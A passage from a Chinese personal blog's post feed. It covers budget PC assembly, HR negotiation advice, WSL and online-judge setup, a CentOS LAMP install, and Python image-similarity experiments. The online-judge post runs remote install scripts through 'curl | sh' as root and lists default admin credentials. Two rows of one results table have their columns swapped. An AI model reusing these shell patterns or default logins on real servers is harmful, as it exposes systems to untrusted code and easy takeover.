      <url>2020/02/20/dian-nao-tai-shi-ji-diy-ji-zu-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>相信老司机都知道台式机的种种好处，因此从零件购买-组装一系列操作毫不含糊（推荐新手阅读知乎了解电脑整机购买和DIY的区别： <a href="https://zhuanlan.zhihu.com/p/38978421" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/38978421</a>  ）。  但是对新手来说，或许还是有难度的，本篇将介绍入门级台式机的选购以及组装。    </p><p><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/ae485a69cb05edb3111231cb0a882ca.jpg" align="center"/></center><br><strong>适合食用人群</strong>：固定地点办公及低配置轻度游戏玩家。  </p><ul><li>选购</li><li>组装</li><li>安装系统</li></ul><h1 id="选购"><a href="#选购" class="headerlink" title="选购"></a>选购</h1><p>台式机主要部件：CPU、显卡、主板、硬盘、内存条、电源、机箱、音响、显示屏  </p><p>预算：2000RMB左右  </p><p>推荐购买渠道：官网/京东自营（PS：一些小规模的店整机出售，看似性能不错，实际上很可能是二手零件组装，建议新手上京东自营购买）  </p><p>因为是入门级的，主要针对办公及低配置轻度游戏玩家（例如玩LOL），所以在这里推荐方案是<strong>暂时</strong>不购买显卡，因为要考虑到电脑的长期使用和可扩展性（计划很可能赶不上变化嘛，也许你现在只玩玩低配置的游戏，以后又玩高配置或者觉得电脑性能需要提升一个阶级呢）办公就不需要独立显卡了，直接选个带核显的cpu。    </p><p>CPU：emmm，cpu从品牌上说分为两大阵营，Intel和AMD。粗略讲，Intel耐用品质好；AMD性价比高，多受游戏玩家钟爱。<br>通过简单的学习粗略地了解一下如何看CPU型号来分辨性能。<br><a href="https://zhuanlan.zhihu.com/p/20519713" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/20519713</a><br>CPU性能可以百度搜索一下”CPU天梯图”（同理，显卡也可以搜索”显卡天梯图”）查看具体性能排行  </p><p>显卡：不买，重度游戏玩家请查看具体游戏配置需求，再选择是1050ti/1660/1080ti/2080ti</p><p>主板：<strong>主板要对上CPU</strong>，最好确定选哪款CPU之后选择推荐主板（例如你买的CPU推荐A320主板，那么就京东搜索”A320主板”，然后挑选一款）。一定要选择CPU支持的主板。推荐主板品牌：华硕、技嘉、微星、华擎（推荐力度有先后顺序），但是具体还是得看看价格。购买主板还得看看支持标准，以及支持几通道内存（就是可以插几个内存条）</p><p>内存条：内存条可以买二手的，但实际上二手九成新的就便宜那么十几块，何必呢<br>内存条这个没太多所谓，海盗船/金士顿/刚威/宇瞻……觉得哪个名字好听就买哪个吧！这时候你购买主板看的内存标准就派上用场了，<strong>注意频率</strong>，看看主板是否支持该显卡频率（比如你买的内存条是DDR4 3000，但是显卡最多支持DDR4 2666，那这样就不行喽）</p><p>电源：电源建议买一线品牌的（例如台达、海韵、振华、安钛克、冷酷至尊，排名不先分后，没在上面的不代表不好，只是列几个给新手挑选），电源不稳定输出会有各种各样的问题。注意功率，如果是办公，300w的电源足够啦，但是考虑到以后可能加显卡，建议还是450W起步吧！（其实电源功率的选择，CPU、主板这些功率加起来再预留个100w就够了）。非发烧友在电源上倒不必太在乎铜牌、银牌、金牌这些分级，差不了多少，省不了多少电。</p><p>硬盘：硬盘分机械硬盘和固态硬盘，办公建议固态，不够补充机械硬盘。对一般人来说1T的储存空间够用了。硬盘基本上是希捷和西部数据两个牌子，同等储存空间、<strong>转速</strong>（转速越高越好）看哪个便宜买哪个。</p><p>机箱：机箱大小分类挺好，为了之后的扩展和通风、易安装等，推荐中塔式机箱（ATX），注意看机箱支持的主板大小和可安装的风扇数量、硬盘个数。挑个好看的机箱。如果要求高就考虑一下隔音。  </p><p>散热硅胶：对的，你没看错。散热硅胶是涂在CPU与散热器之间的，主要是为了让CPU和散热器紧密性良好以达到良好的散热效果。为什么这里要额外买呢（盒装的CPU里面一般都有），因为原装的散热硅胶很可能是“水泥”（就是散热器装上去就拿不下来了QAQ，而且散热效果又……）所以还是建议买一支，或者找认识的修电脑的朋友拿点。  </p><p>显示屏：参考屏幕尺寸、色域、刷新率、分辨率、可视角度。值得说说的是，刷新率不是越高越好，游戏玩家需要高刷新率，但是如果是设计师，高刷新率反而成了累赘。屏幕大看着爽；色域高颜色鲜艳饱满；有些可视角度较小可以起到防窥屏的作用……   </p><p>音响：首先区别下音响和音箱，音响是指整个设备，音箱~就一个箱子。音响的购买主要看功率、信噪比、声道、频响范围、失真率。一般是额定功率越高越好，信噪比越高越好，频响范围越大越好，失真率越低越好。声道常见的有2.0、2.1、5.1、7.1。小数点前面的数字是中高音音响个数，后面的数字是低音音响个数。（2.0的设计不太一样，2.0是把低音做在两个音箱上了，后面三种是把低音分离出来到一个独立的音箱）一般入门级的音响都是2.0、2.1的声道，建议听音乐选2.0，震撼场面例如看电影、打游戏选2.1。  </p><ul><li>列个参考表单</li></ul><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/blog/运维/04a8a6b6a997b4ac0da55a1f7da346c.jpg" alt="img"></p><p>可以根据自己的预算调整配置，比如纯办公和听音乐看电影，就可以把8G的内存换成4G的；CPU换成大概在400价位的速龙3000或Intel奔腾5420（对应的主板也换成知名度相对较低的，能便宜个几十元）电源换成300W的；音响换成几十元的2.0声道；硬盘找个机械硬盘顶一下（但是千万不要为了省钱买二手的）……同理，也可以根据自己的实际需求调高配置。如果是打游戏，duck不必各方面都调高，直接买显卡呀！    </p><h1 id="组装"><a href="#组装" class="headerlink" title="组装"></a>组装</h1><blockquote><ul><li>首先，洗个手冷静一下，莫慌，很简单的。  </li></ul><ul><li>先把CPU的针脚对应主板的针脚，拉起主板上放置CPU的闸，将CPU放入（放置正确会感觉CPU被吸进主板）然后稍微用点力将闸拉下扣住。</li></ul><ul><li>在CPU上涂点散热硅胶，不要太多也不要太少，散热器压下去会让散热硅胶均匀，但是不要让散热硅胶碰到主板了。 </li></ul><ul><li>把主板上两个固定的板拆下（底座留着）散热器（盒装主板都带有的）四个螺丝位对上，对着卡扣压下去，觉得稳了就行了。（京东购买主板的页面查看详情有介绍安装）</li></ul><ul><li><p>把内存条卡槽两边拉开，对着卡位插入内存条。</p></li><li><p>然后拆开机箱（一般都是后面拧下螺丝，然后两侧的板向后滑动）</p></li></ul><ul><li>一般机箱都是把把电源安装在机箱上方的尾部（你想想台式机是不是一般都是后面插电），风扇朝下，拧上四颗螺丝（买机箱都会送对应的螺丝），线接在主板写了CPU fun那里。</li></ul><ul><li>把赠送的主板IO挡板从机箱内部放到机箱尾部（一般插网线、usb的那个位置），敲一下装上固定。</li></ul><ul><li>主板对上接口找到分散在主板边缘的孔位，拧上螺丝。</li></ul><ul><li>将硬盘固定在机箱指定的位置，拧紧螺丝（如果不紧，开机后可能会有声音，硬盘振动的声音）</li></ul><ul><li><p>主板、硬盘接上电源线，插的时候看卡扣位置就知道该哪个方向了。硬盘线插在主板上。</p></li><li><p>找找机箱线的接口（一般在主板边缘），一一对应接上去。</p></li><li><p>盖上机箱。</p></li></ul></blockquote><h1 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h1><p><a href="../../../02/29/an-zhuang-deepin-xi-tong/">推荐我的另一篇博文，安装deepin系统</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzIwMjE1MjMyMw==&amp;mid=2650203538&amp;idx=3&amp;sn=86ad2269949d7cb09b6ecbf3a38f5822&amp;chksm=8ee1457eb996cc6803b8d151844740325b9ab39e06511c7f31183c386bb91f9a67a82200fb7f&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">软件安装管家，安装win10</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>双系统安装-ubuntu</title>
      <link href="2020/02/17/shuang-xi-tong-an-zhuang-ubuntu/"/>
      <url>2020/02/17/shuang-xi-tong-an-zhuang-ubuntu/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面对流氓HR，新人该注意什么</title>
      <link href="2020/02/09/mian-dui-liu-mang-hr-xin-ren-gai-zhu-yi-shi-me/"/>
      <url>2020/02/09/mian-dui-liu-mang-hr-xin-ren-gai-zhu-yi-shi-me/</url>
      
        <content type="html"><![CDATA[<p>该文章为学习B站UP主<a href="https://space.bilibili.com/119801456" target="_blank" rel="noopener">老蒋巨靠谱</a>的视频所记录。</p><p>原视频来自bilibili：<a href="https://www.bilibili.com/video/av77107846" target="_blank" rel="noopener">网易暴力裁员：面对面对流氓HR，新人应该注意什么</a></p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>网易裁员 ，开除患重病员工，存在HR套路员工的情况</p><p>小公司常做这种不合规的事</p><h2 id="非正常裁员保护利益的手段"><a href="#非正常裁员保护利益的手段" class="headerlink" title="非正常裁员保护利益的手段"></a>非正常裁员保护利益的手段</h2><h3 id="1-不要把HR当朋友"><a href="#1-不要把HR当朋友" class="headerlink" title="1.不要把HR当朋友"></a>1.不要把HR当朋友</h3><p><strong>HR</strong>：工作内容是缩减人力成本，几乎都有KPI考核（员工离职前的年终、离职补偿等都属于人力成本，<strong>HR的工作内容是缩减人力成本</strong>,甚至有些公司的HR的工作目标和业绩就是尽可能地压缩员工利益），从员工角度考虑HR的员工百中无一</p><p>人情是人情，工作是工作</p><p>产生利益冲突只剩劳资关系</p><p>员工与公司产生利益冲突，自己可不惜以最坏的恶意去揣测</p><p>HR晓之以情动之以理，eg：”我们HR也要恰饭”————正解：就算真的伤害到HR，这不是公司在HR制度方面和价值观的错，如果自己做的正确就不应该为公司的错埋单（收起幼稚的同理心）</p><h3 id="2-留档意识"><a href="#2-留档意识" class="headerlink" title="2.留档意识"></a>2.留档意识</h3><p>利益冲突保持不正常状态，做到以下三点：</p><ol><li><ul><li><p><strong>第一时间备份</strong>（工作成果、内容、素材；OA系统、邮件系统、各种群聊和同事领导HR的沟通记录，行政信息、业绩评定）————公司能在触及你利益前把你的所有权限停掉；</p></li><li><p><strong>录音</strong></p></li></ul></li><li><p><strong>反被害思维</strong>(领导HR也对自己录音)：</p><ul><li>谨言慎行（例如:“不要轻易承认自己工作中的错误”，任何工作都是不完美的，新人可能会说：“虽然自己做的不好，但是同组的其他人也不比我好啊…”，HR会找茬，反击：“我不认可你说的这些话，如果想跟我讨论我在工作中的失误，请你先准备好关于我工作存在重大失误的相关证据再谈。”  ）</li><li><strong>不要轻易在法律文书上签字</strong>(签字之后就没有回头路了，维权不了)</li></ul><p><strong>博弈</strong></p><ul><li><p>典型情况：公司不想付出n+1的裁员成本，员工想拿到赔偿但不想留下辞退记录（双方互利操作：员工主动辞职，公司赔偿少于n+1.)</p><p>(赔偿注意防止套路，与HR达成的<strong>口头协议</strong>都当作不存在,坚决避免先主动提交辞职，看到钱或者先签补偿性条款再说）</p></li></ul></li><li><p>关键沟通要走OA系统或邮件（要是公司邮箱，不能是个人邮箱，而且最好抄送HR部门最高领导，防止说是私人沟通不代表公司立场）</p><p>案例：小公司员工被裁想获得n+1补偿，HR说不如你先放个一周的年假回来再谈（小公司没有OA系统，没有申请放假，口头达成一致，回来被告知旷工）</p></li></ol><h3 id="3-谈判前详细了解劳动法并且想好自己的底线和筹码"><a href="#3-谈判前详细了解劳动法并且想好自己的底线和筹码" class="headerlink" title="3.谈判前详细了解劳动法并且想好自己的底线和筹码"></a>3.谈判前详细了解劳动法并且想好自己的底线和筹码</h3><p>基本前提懂法（中华人民共和国劳动法），当地劳动局有无补充条款，咨询劳动者保护热心</p><p>想好诉求，而不是愤怒；想好怎么保护自己而不是给对方最大的伤害</p><p>筹码：加班费、全额的五险一金（比如你月薪1万，公司按3千的标准给你交社保）</p><p>底线：工资（离职前给我，少一分都不行），社保（虽然不是全额，但每个月的社保给我交，少一个月也不行），无法接受业绩良好的情况下公司找个借口不给我补偿</p><p>最终计算工资，常用的是，把这个月的实际工作天数除以21.75，而不是除以30（比如我离职这个月工作了10.875天，公司得付我半个月的工资）</p><p>法定假日带薪，应该计入工作时长（1月1日带薪，2、3号调休）</p><p>如果公司不想赔偿让员工走人，请跟HR说：“这一点我很抱歉，我无法接受，我相信咱们公司不会这么坑员工，我也相信您是一个好人，是个知情达理的人。”（先抬HR和公司）“但我也是个知情达理的人，虽然我知道公司没有每个月按照我的实际标准缴纳社保，但这是在我入职的时候跟我谈好的，所以我虽然有这样的权利，但是您放心，我不会把这个事捅到劳动局去瞎闹。只要公司能考虑到我的利益，咱们都过得去就行了。”（这句话的意思：说明自己的底线，告诉HR自己的筹码）</p><h3 id="4-不要轻易动用“核武器”"><a href="#4-不要轻易动用“核武器”" class="headerlink" title="4.不要轻易动用“核武器”"></a>4.不要轻易动用“核武器”</h3><p>不要企图用公司/老板真正的黑料去威胁公司，尤其是不要去威胁小公司（前面都是没有翻脸，就算是捅到劳动局了，小公司无非赔个几万到几十万）例如爆料投标（虽说出于正义，但也不可，且一般小公司黑料没有公共性议题的价值，且一般人没有公关方面的资源和经验）</p><p>做了没有妥协空间，大公司有舆论压力，小公司没有~可能立马翻脸</p><p>用了爆黑料事情大概率会脱离掌控或预知</p><h3 id="5-劳动法是倾向于劳动者一方的，要有底气"><a href="#5-劳动法是倾向于劳动者一方的，要有底气" class="headerlink" title="5.劳动法是倾向于劳动者一方的，要有底气"></a>5.劳动法是倾向于劳动者一方的，要有底气</h3><p>劳资双方力量不等对，劳动者脆弱，但…</p><p>常见猫腻：</p><ul><li><p>不签劳动合同（例如盖公章的负责人不在）</p><p>法律上存在劳动事实（需要材料相互印证，例如和同事的沟通记录、工作成果、工作中间素材、工牌、饭卡、上岗证等也可以成为裁定依据——只要有，就算没有劳动合同也不影响），且<strong>不签劳动合同公司需要给双倍赔偿</strong></p></li><li><p>HR用劳动法第3章第25条来威胁员工</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200209010613863.png" alt="image-20200209010613863"></p><p>流氓HR常用第2条和第3条，比如说你违反公司纪律，迟早早退、项目里没有按照规定造成损失等（击垮你的心理防线），并放下话：“如果你不主动走，就依法开除你。”（咨询在其他公司的HR朋友和当地劳动局）</p><p>法律中真正认定劳动者存在严重违反劳动纪律或者公司规定的情况或者造成公司重大损失<strong>是一件很困难的事，条件对公司来说很苛刻</strong>（公司内容本身必须合理合法否则认定为无效条文；且公司需证明规章制度经过了民主的程序；公司需证明规则制度向全体员工公示或告知过~墙上贴着也不算，需要公司邮件发过或者群里发过并让员工回复收到请确认或者纸质材料签字；且公司需要提交证明）</p><p><strong>劳动仲裁是武器，不要轻易动用</strong>，不要轻易放弃自己的权利。</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>系统：WSL（win10的子系统Linux）</title>
      <link href="2020/02/05/xi-tong-wsl-win10-de-zi-xi-tong-linux/"/>
      <url>2020/02/05/xi-tong-wsl-win10-de-zi-xi-tong-linux/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>在Windows下使用linux系统（可shell命令行操作或图形界面操作）</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="　步骤"></a>　步骤</h2><ul><li><a href="https://blog.csdn.net/m0_37990055/article/details/89709963?from=groupmessage" target="_blank" rel="noopener">建立软链接（非必须）</a></li><li><a href="https://blog.csdn.net/zhouzme/article/details/78780479" target="_blank" rel="noopener">安装Ubuntu</a></li><li><a href="https://www.jianshu.com/p/f7ce44ecdd06" target="_blank" rel="noopener">安装并配置cmder（非必须）</a></li><li><a href="https://blog.csdn.net/NovaSliver/article/details/83190269" target="_blank" rel="noopener">安装并连接图形界面</a></li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://blog.csdn.net/zhouzme/article/details/78780479" target="_blank" rel="noopener">Windows10安装Linux子系统Ubuntu  神神的蜗牛</a></p><p><a href="https://blog.csdn.net/m0_37990055/article/details/89709963?from=groupmessage" target="_blank" rel="noopener">Windows下Linux子系统迁移到非系统盘  zhanjzh </a></p><p><a href="https://www.jianshu.com/p/3e627ff45ccb" target="_blank" rel="noopener">Windows 安装和配置 WSL 希希里之海</a></p><p><a href="https://blog.csdn.net/NovaSliver/article/details/83190269" target="_blank" rel="noopener">Win10Linux子系统（WSL）图形界面的安装  NovaSliver</a></p><p><a href="https://www.jianshu.com/p/f7ce44ecdd06" target="_blank" rel="noopener"><em>LG</em></a></p>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建OJ系统</title>
      <link href="2020/02/04/da-jian-oj-xi-tong/"/>
      <url>2020/02/04/da-jian-oj-xi-tong/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本文介绍如何利用开源OJ系统源码快速搭建OJ系统</p><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><ol><li><p>安装依赖环境</p><p>ubuntu系统用户：</p><pre class=" language-lang-shell"><code class="language-lang-shell"> sudo apt-get update && sudo apt-get install -y vim python-pip curl git pip install docker-compose</code></pre><p>centos系统用户：</p><pre class=" language-lang-shell"><code class="language-lang-shell"> yum update && yum install -y vim python-pip curl git pip install docker-compose</code></pre></li></ol><ol><li><p>安装docker</p><p> 国内用户使用脚本一键安装:<code>sudo curl -sSL https://get.daocloud.io/docker | sh</code> </p><p>国外用户使用脚本一键安装: <code>sudo curl -sSL get.docker.com | sh</code></p></li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ol><li><p>克隆源码</p><pre class=" language-lang-shell"><code class="language-lang-shell">  git clone -b 2.0 https://github.com/QingdaoU/OnlineJudgeDeploy.git && cd OnlineJudgeDeploy</code></pre></li><li><p>启动docker</p><pre><code>  docker-compose up -d</code></pre><ul><li>可能遇到的问题：ERROR: Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it running?</li><li>解决办法: 运行命令<code>sudo systemctl start docker</code>启动docker(若无效请查看<a href="https://www.awaimai.com/2587.html" target="_blank" rel="noopener">参考资料</a>按照对应情况排查)</li></ul></li><li><p>运行OJ系统</p><pre class=" language-lang-shell"><code class="language-lang-shell">  docker ps -a</code></pre></li><li><p>修改端口</p><p>一般80和443端口都被占用了,所以得修改端口</p><p><code>vim  docker-compose.yml</code>  </p><p>在最下面修改端口号</p></li><li><p>打开web浏览器访问</p><p><code>本机ip+端口</code>访问OJ首页</p><p><code>本机ip+端口/admin</code>     (初始账号用户名 root ，密码 rootroot )</p><p>例如，ip是185.12.254.40，第四步骤设置的其中一个端口是1000 </p><p>则通过<code>185.12.254.40:1000</code>访问首页</p><p><code>`185.12.254.40:1000/admin</code>访问管理员帐号</p></li></ol><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://cndrew.cn/2019/08/23/oj/" target="_blank" rel="noopener">开源青岛大学oj的搭建(傻瓜式操作) ： Uncle_drew </a></p><p><a href="https://www.awaimai.com/2587.html" target="_blank" rel="noopener">docker-compose up解决错误ERROR: Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it running?</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 建站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS搭建LAMP环境</title>
      <link href="2020/02/03/centos-da-jian-lamp-huan-jing/"/>
      <url>2020/02/03/centos-da-jian-lamp-huan-jing/</url>
      
        <content type="html"><![CDATA[<h2 id="命令行安装"><a href="#命令行安装" class="headerlink" title="命令行安装"></a>命令行安装</h2><ol><li><h2 id="搭建mysql数据库"><a href="#搭建mysql数据库" class="headerlink" title="搭建mysql数据库"></a>搭建mysql数据库</h2><pre><code>yum install mysql-server -yservice mysqld restart/usr/bin/mysqladmin -u root password &#39;AAAAAA&#39;</code></pre></li><li><h2 id="安装Apache服务"><a href="#安装Apache服务" class="headerlink" title="安装Apache服务"></a>安装Apache服务</h2><pre><code>yum install httpd -yservice httpd start</code></pre></li></ol><ol><li><h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><pre><code>yum install php php-mysql -y</code></pre></li></ol><ol><li><h2 id="检查安装是否成功"><a href="#检查安装是否成功" class="headerlink" title="检查安装是否成功"></a>检查安装是否成功</h2><pre><code>&lt;?php phpinfo(); ?&gt;service httpd restart</code></pre></li></ol><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200203220714387.png" alt="image-20200203220714387"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200203220845307.png" alt="image-20200203220845307"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200203220937130.png" alt="image-20200203220937130"></p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200203220959012.png" alt="image-20200203220959012"></p><h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200203221838197.png" alt="image-20200203221838197"></p><h2 id="宝塔安装"><a href="#宝塔安装" class="headerlink" title="宝塔安装"></a>宝塔安装</h2><p>如果嫌麻烦，用宝塔，一句命令行的事情。</p><p><a href="https://www.bt.cn/" target="_blank" rel="noopener">宝塔官网</a></p><p><a href="https://www.bt.cn/bbs/thread-19376-1-1.html" target="_blank" rel="noopener">Linux版宝塔安装链接</a></p>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 建站 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单的图像相似度计算方法</title>
      <link href="2020/01/15/jian-dan-de-tu-xiang-xiang-si-du-ji-suan-fang-fa/"/>
      <url>2020/01/15/jian-dan-de-tu-xiang-xiang-si-du-ji-suan-fang-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="塑料瓶图像检测"><a href="#塑料瓶图像检测" class="headerlink" title="塑料瓶图像检测"></a>塑料瓶图像检测</h2><p>目的：用于判断一张图片是否为塑料瓶；</p><p>条件：总计300多张图片分为70多类，同一类塑料瓶分别放置在同一个文件夹；</p><p>思路：选取每个文件夹的一张图片与目标图片对比计算返回相似度最高的值，通过多次试验确定阈值，超过阈值则判定为是塑料瓶，否则不是；</p><p>目录：</p><p>[TOC]</p><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul><li><p>所有测试结果均为程序第一次运行结果</p></li><li><p>每一组测试的第一个（第一个样本）都是同一张图片相互比对</p></li><li><p>每一组测试的第二三四五个测试样本均是与第一个测试样本比对</p></li><li><p>以下为选用的5个测试样本</p></li><li><p>图片放置在与程序同一位置的images文件夹</p></li></ul><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20200114104340189-1592736787820.jpg" width="40%"/></center><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20200114104446378-1592736787433.jpg" width="40%"/></center><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/202001141044484-1592736787888.jpg" width="40%"/></center><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20200114104502540-1592736787890.jpg" width="40%"/></center><center><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/20200114104509945-1592736787431.jpg" width="40%"/></center><h2 id="1-方法"><a href="#1-方法" class="headerlink" title="1.方法"></a>1.方法</h2><ul><li><p>直方图</p></li><li><p>互信息</p></li><li>余弦相似度 </li><li>感知哈希算法</li></ul><h2 id="2-测试结果（单张图片比对）"><a href="#2-测试结果（单张图片比对）" class="headerlink" title="2.测试结果（单张图片比对）"></a>2.测试结果（单张图片比对）</h2><h3 id="直方图"><a href="#直方图" class="headerlink" title="直方图"></a>直方图</h3><pre class=" language-lang-python"><code class="language-lang-python">from time import *begin_time = time()from PIL import Imagedef make_regalur_image(img, size=(256, 256)):    return img.resize(size).convert('RGB')def hist_similar(lh, rh):    assert len(lh) == len(rh)    return sum(1 - (0 if l == r else float(abs(l - r)) / max(l, r)) for l, r in zip(lh, rh)) / len(lh)def calc_similar(li, ri):    return hist_similar(li.histogram(), ri.histogram())if __name__ == '__main__':    img1 = Image.open('images/WIN_20200111_21_56_10_Pro.jpg')    img1 = make_regalur_image(img1)    img2 = Image.open('images/WIN_20200111_21_56_52_Pro.jpg')    img2 = make_regalur_image(img2)    print(calc_similar(img1, img2))end_time = time()run_time = end_time-begin_timeprint ('该程序运行时间：',run_time)</code></pre><div class="table-container"><table><thead><tr><th>测试方式</th><th>（图像）文件名</th><th>耗时（s）</th><th>Result</th></tr></thead><tbody><tr><td>素材（自比）</td><td>WIN_20200111_21_56_10_Pro.jpg</td><td>0.055361032485961914</td><td>1.0</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_56_52_Pro.jpg</td><td>0.06594681739807129</td><td>0.6108132256943336</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_57_05_Pro.jpg</td><td>0.05501222610473633</td><td>0.6398035067201021</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_58_01_Pro.jpg</td><td>0.05424642562866211</td><td>0.7139745065909696</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_22_02_08_Pro.jpg</td><td>0.07813024520874023</td><td>0.7189068678053613</td></tr></tbody></table></div><h3 id="互信息"><a href="#互信息" class="headerlink" title="互信息"></a>互信息</h3><pre class=" language-lang-python"><code class="language-lang-python">from time import *begin_time = time()from sklearn import metrics as mrfrom scipy.misc import imreadimport numpy as npimg1 = imread('1.jpg')img2 = imread('2.jpg')img2 = np.resize(img2, (img1.shape[0], img1.shape[1], img1.shape[2]))img1 = np.reshape(img1, -1)img2 = np.reshape(img2, -1)print(img2.shape)print(img1.shape)mutual_infor = mr.mutual_info_score(img1, img2)print(mutual_infor)end_time = time()run_time = end_time-begin_timeprint ('该程序运行时间：',run_time)</code></pre><div class="table-container"><table><thead><tr><th>测试方式</th><th>（图像）文件名</th><th>耗时（s）</th><th>Result</th></tr></thead><tbody><tr><td>素材（自比）</td><td>WIN_20200111_21_56_10_Pro.jpg</td><td>1.459466791152954</td><td>(6220800,)<br/>(6220800,)<br/>4.842347326725792</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_56_52_Pro.jpg</td><td>1.531355381011963</td><td>(6220800,)<br/>(6220800,)<br/>1.3835594221461103</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_57_05_Pro.jpg</td><td>1.5626063346862793</td><td>(6220800,)<br/>(6220800,)<br/>1.2697158354875515</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_58_01_Pro.jpg</td><td>1.5668601989746094</td><td>(6220800,)<br/>(6220800,)<br/>1.40573402284614</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_22_02_08_Pro.jpg</td><td>1.5644567012786865</td><td>(6220800,)<br/>(6220800,)<br/>0.6813656974353114</td></tr></tbody></table></div><h3 id="余弦相似度"><a href="#余弦相似度" class="headerlink" title="余弦相似度"></a>余弦相似度</h3><pre class=" language-lang-python"><code class="language-lang-python">from time import *begin_time = time()from PIL import Imagefrom numpy import average, linalg, dotdef get_thumbnail(image, size=(1200, 750), greyscale=False):    image = image.resize(size, Image.ANTIALIAS)    if greyscale:        image = image.convert('L')    return imagedef image_similarity_vectors_via_numpy(image1, image2):    image1 = get_thumbnail(image1)    image2 = get_thumbnail(image2)    images = [image1, image2]    vectors = []    norms = []    for image in images:        vector = []        for pixel_tuple in image.getdata():            vector.append(average(pixel_tuple))        vectors.append(vector)        norms.append(linalg.norm(vector, 2))    a, b = vectors    a_norm, b_norm = norms    res = dot(a / a_norm, b / b_norm)    return resimage1 = Image.open('images/WIN_20200111_21_56_10_Pro.jpg')image2 = Image.open('images/WIN_20200111_21_56_10_Pro.jpg')cosin = image_similarity_vectors_via_numpy(image1, image2)print(cosin)end_time = time()run_time = end_time-begin_timeprint ('该程序运行时间：',run_time)</code></pre><div class="table-container"><table><thead><tr><th>测试方式</th><th>（图像）文件名</th><th>耗时（s）</th><th>Result</th></tr></thead><tbody><tr><td>素材（自比）</td><td>WIN_20200111_21_56_10_Pro.jpg</td><td>19.579540729522705</td><td>0.9999999999999746</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_56_52_Pro.jpg</td><td>19.23276400566101</td><td>0.9751567803348392</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_57_05_Pro.jpg</td><td>19.25089430809021</td><td>0.9726385998457207</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_21_58_01_Pro.jpg</td><td>0.9807553738212222</td><td>19.210497856140137</td></tr><tr><td>两张图片比对</td><td>WIN_20200111_22_02_08_Pro.jpg</td><td>0.9038901804349453</td><td>19.01563835144043</td></tr></tbody></table></div><h3 